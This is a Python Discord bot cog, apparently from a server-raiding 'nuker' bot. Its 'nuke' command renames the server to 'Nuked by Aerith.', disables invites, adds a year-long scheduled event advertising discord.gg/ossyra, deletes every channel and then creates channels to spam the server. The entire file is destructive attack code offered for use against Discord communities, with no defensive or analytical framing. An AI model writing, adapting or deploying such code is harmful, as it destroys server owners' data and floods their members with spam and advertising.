import discord
from discord.ext import commands
from datetime import (
    datetime, 
    timedelta, 
    timezone
)
from src.operations.operations import (
    delete_channels, 
    create_channels_and_spam
)

class Nuke(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(name="nuke")
    async def nuke(self, ctx: commands.Context):
        await ctx.message.delete()
        await ctx.guild.edit(
            name="Nuked by Aerith.",
            description="this server has been nuked by Aerith, join discord.gg/ossyra for bots like this!",
            invites_disabled_until=datetime.now(timezone.utc) + timedelta(days=1),
            community=False
        )
        start_time = datetime.now(timezone.utc) + timedelta(seconds=5)
        end_time = start_time + timedelta(days=365)
        try:
            await ctx.guild.create_scheduled_event(
                name="Aerith was HERE!",
                description="join discord.gg/ossyra for bots like this!",
                start_time=start_time,
                end_time=end_time,
                entity_type=discord.EntityType.external,
                location="https://discord.gg/ossyra"
            )
        except discord.HTTPException:
            pass
        await delete_channels(ctx.guild)
        await create_channels_and_spam(ctx.guild)
